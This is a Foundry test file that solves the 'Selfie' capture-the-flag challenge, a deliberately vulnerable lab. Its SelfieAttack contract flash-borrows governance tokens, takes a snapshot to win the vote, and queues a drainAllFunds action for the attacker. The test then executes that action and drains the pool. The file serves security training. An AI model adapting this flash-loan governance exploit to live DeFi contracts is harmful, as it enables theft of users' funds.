// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract SelfieAttack {
    SelfiePool selfiePool;
    DamnValuableTokenSnapshot govToken;
    address owner;
    constructor(SelfiePool _selfiePool, DamnValuableTokenSnapshot _govToken) {
        owner = msg.sender;
        selfiePool = _selfiePool;
        govToken = _govToken;
    }

    function attack() external {
        // TOKENS_IN_POOL
        uint256 amount = selfiePool.token().balanceOf(address(selfiePool));
        // flashloan the tokens
        selfiePool.flashLoan(amount);
    }

    function receiveTokens(address _addr, uint256 borrowAmount) external {
        // called during flashloan
        // take snapshot so we can vote. (we have 75% of the supply)
        govToken.snapshot();
        // queue our malicious action to drain all funds.
        selfiePool.governance().queueAction(address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0);
        // pay back our flashloan
        govToken.transfer(address(selfiePool), borrowAmount);
        // now we have to wait two days to execute the malicious queued action.
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    //forge test --match-contract Selfie
    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        SelfieAttack selfieAttack = new SelfieAttack(selfiePool, simpleGovernance.governanceToken());
        selfieAttack.attack();
        //skip 2 days cause of action delay
        vm.warp(block.timestamp + 2 days);
        // execute our malicious action (1).
        simpleGovernance.executeAction(1);
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
